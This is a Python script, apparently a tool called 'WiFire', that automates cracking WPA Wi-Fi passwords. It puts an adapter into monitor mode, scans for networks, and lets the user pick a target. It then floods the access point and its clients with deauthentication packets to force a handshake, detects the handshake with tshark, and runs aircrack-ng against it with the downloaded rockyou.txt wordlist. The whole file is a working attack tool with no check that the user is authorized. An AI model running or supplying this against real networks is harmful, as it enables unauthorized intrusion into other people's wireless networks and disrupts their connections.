#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import re
import csv
import shutil


try:
    from colorama import init, Fore, Style
    import pyfiglet
except ImportError:
    print("[*] Installing Python dependencies...")
    subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "colorama", "pyfiglet"])
    from colorama import init, Fore, Style
    import pyfiglet


init(autoreset=True)


DEAUTH_ROUNDS = 6
CAPTURE_DELAY = 30  
DEAUTH_SLEEP = 8
REQUIRED_TOOLS = [
    "aircrack-ng", "airodump-ng", "aireplay-ng", "reaver", "bully", "xterm", "wget", "tshark"
]

def banner(text):
    print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format(text, font="slant"))

def print_section(title):
    bar = '─' * (len(title) + 6)
    print(f"\n{Fore.CYAN}{Style.BRIGHT}┌{bar}┐")
    print(f"│   {title}   │")
    print(f"└{bar}┘{Style.RESET_ALL}{Fore.RESET}")

def spinner(message, duration=6):
    steps = "|/-\\"
    sys.stdout.write(Fore.YELLOW + message + " ")
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(steps[i % len(steps)])
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')
        i += 1
    sys.stdout.write(Fore.RESET)

def install_missing_tools():
    print_section("TOOL CHECKS")
    for tool in REQUIRED_TOOLS:
        if shutil.which(tool):
            print(f"{Fore.GREEN}[+] {tool} available")
        else:
            print(f"{Fore.YELLOW}[!] Installing {tool}...")
            subprocess.run(["apt", "install", "-y", tool], stdout=subprocess.DEVNULL)

def download_rockyou():
    print_section("WORDLIST CHECK")
    if not os.path.exists("rockyou.txt"):
        print(f"{Fore.YELLOW}[+] Downloading rockyou.txt...")
        subprocess.run(["wget",
                        "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
                        "-O", "rockyou.txt"])
    print(f"{Fore.GREEN}[+] rockyou.txt ready.")

def get_interfaces():
    result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
    return [line.split()[1] for line in result.stdout.splitlines() if line.strip().startswith("Interface")]

def enable_monitor_mode(interface):
    print(f"{Fore.YELLOW}[DEBUG] Setting {interface} to monitor mode...{Fore.RESET}")
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", interface, "down"])
    subprocess.run(["iw", interface, "set", "monitor", "none"])  
    subprocess.run(["ip", "link", "set", interface, "up"])
    print(f"{Fore.GREEN}[+] {interface} is now in monitor mode.")

def restore_network_services():
    print_section("RESTORING NETWORK")
    subprocess.run(["service", "NetworkManager", "start"], stdout=subprocess.DEVNULL)
    subprocess.run(["service", "wpa_supplicant", "start"], stdout=subprocess.DEVNULL)
    print(f"{Fore.GREEN}[+] Network services restored. Wi-Fi should work now.")

def start_scan(interface):
    print_section("SCANNING")
    print(f"{Fore.YELLOW}[!] Ctrl+C when your target appears in the scan window or Directly close other terminal.")
    for ext in ['csv', 'cap', 'netxml']:
        try: os.remove(f"scan_results-01.{ext}")
        except: pass
    subprocess.run([
        "xterm", "-T", "Wi-Fi Scanner", "-hold", "-e",
        f"bash -c \"airodump-ng -w scan_results --output-format csv {interface}\""
    ])

def parse_scan():
    networks, clients = [], []
    with open("scan_results-01.csv") as f:
        reader = csv.reader(f)
        section = "network"
        for row in reader:
            if not row: continue
            if "Station MAC" in row[0]:
                section = "clients"
                continue
            if section == "network" and len(row) > 13:
                bssid = row[0].strip()
                ch = row[3].strip()
                enc = row[5].strip().upper()
                essid = row[13].strip()
                wps  = row[16].strip() if len(row) > 16 else ""
                networks.append({'bssid': bssid, 'channel': ch, 'enc': enc, 'essid': essid, 'wps': wps})
            elif section == "clients" and len(row) >= 6:
                client = row[0].strip()
                ap_mac = row[5].strip()
                clients.append({'client': client, 'ap': ap_mac})
    return networks, clients

def choose_target(networks):
    print_section("CHOOSE TARGET")
    for i, ap in enumerate(networks, 1):
        wps_flag = f"{Fore.GREEN}[WPS]{Fore.RESET}" if ap['wps'] else ""
        print(f"{i}) {ap['essid']} | {ap['bssid']} | CH {ap['channel']} | {ap['enc']} {wps_flag}")
    while True:
        try:
            i = int(input("Target number > ")) - 1
            if 0 <= i < len(networks): return networks[i]
        except: pass

def start_capture(interface, ch, bssid, essid):
    
    for ext in ['cap', 'csv', 'netxml']:
        for f in os.listdir('.'):
            if f.startswith(f"{essid}_capture") and f.endswith(f".{ext}"):
                try: os.remove(f)
                except: pass

    print(f"{Fore.YELLOW}[DEBUG] Starting capture for {essid} on channel {ch}{Fore.RESET}")
    subprocess.run(["iwconfig", interface, "channel", ch], stdout=subprocess.DEVNULL)
    cap_base = f"{essid}_capture"
    proc = subprocess.Popen([
        'airodump-ng', '-c', ch, '--bssid', bssid, '-w', cap_base, interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap_file = f"{cap_base}-01.cap"
    return proc, cap_file

def send_deauth(interface, bssid, ch, client=None):
    print(f"{Fore.YELLOW}[DEBUG] Sending deauth to {bssid} (client: {client}) on channel {ch}{Fore.RESET}")
    subprocess.run(["iwconfig", interface, "channel", ch], stdout=subprocess.DEVNULL)
    command = ["aireplay-ng", "--deauth", "20", "-a", bssid]  
    if client:
        command += ["-c", client]
    command.append(interface)
    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def check_handshake(bssid, cap_file):
    if not os.path.exists(cap_file):
        print(f"{Fore.RED}[DEBUG] Capture file {cap_file} not found.{Fore.RESET}")
        return False
    try:
        res = subprocess.run(["tshark", "-r", cap_file, "-Y", "eapol"], capture_output=True, text=True)
        if res.stdout.strip():
            print(f"{Fore.GREEN}[DEBUG] Handshake detected in {cap_file}{Fore.RESET}")
            return True
        else:
            print(f"{Fore.RED}[DEBUG] No handshake in {cap_file}{Fore.RESET}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[DEBUG] Handshake check failed: {e}{Fore.RESET}")
        return False

def crack_password(cap_file, wordlist="rockyou.txt"):
    print(Fore.YELLOW + "[*] Launching aircrack-ng (real-time view)\n" + Fore.RESET)
    subprocess.run(["aircrack-ng", "-w", wordlist, cap_file])

def main():
    try:
        banner("WiFire")
        print("        -----> By Pranit Thorat")
        if os.geteuid() != 0:
            sys.exit(Fore.RED + "[!] Run as root" + Fore.RESET)
        install_missing_tools()
        download_rockyou()

        print_section("INTERFACE SETUP")
        interfaces = get_interfaces()
        for i, name in enumerate(interfaces, 1): print(f"{i}) {name}")
        iface = interfaces[int(input("Select adapter number > ")) - 1]
        enable_monitor_mode(iface)

        start_scan(iface)
        networks, clients = parse_scan()
        if not networks:
            print(Fore.RED + "[!] No networks found." + Fore.RESET)
            return
        ap = choose_target(networks)
        bssid, essid, ch, wps = ap['bssid'], ap['essid'], ap['channel'], ap['wps']
        target_clients = [c['client'] for c in clients if c['ap'].lower() == bssid.lower()]

        print_section("ATTACK")
        print(f"{Fore.GREEN}[*] Target: {essid} ({bssid}), CH: {ch}{Fore.RESET}")
        print(f"{Fore.YELLOW}[+] Clients: {', '.join(target_clients) if target_clients else 'None'}{Fore.RESET}")

        capture_proc, cap_file = start_capture(iface, ch, bssid, essid)
        time.sleep(5)

        handshake_ok = False
        for i in range(DEAUTH_ROUNDS):
            print(Fore.YELLOW + f"[*] Deauth Round {i+1}/{DEAUTH_ROUNDS}" + Fore.RESET)
            clients_to_attack = target_clients if target_clients else [None]
            for victim in clients_to_attack:
                send_deauth(iface, bssid, ch, victim)
            spinner("Waiting for handshake capture...", CAPTURE_DELAY)
            if check_handshake(bssid, cap_file):
                print(Fore.GREEN + "[✓] Handshake captured!" + Fore.RESET)
                handshake_ok = True
                break
            else:
                print(Fore.RED + "[✗] No handshake yet..." + Fore.RESET)

        capture_proc.terminate()

        if handshake_ok:
            crack_password(cap_file)
        else:
            print(Fore.RED + "[!] Handshake not captured. Try a different time/target." + Fore.RESET)

    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user. Cleaning up..." + Fore.RESET)

    finally:
        restore_network_services()
        print(Fore.CYAN + "\n✅ Done." + Fore.RESET)

if __name__ == "__main__":
    main()
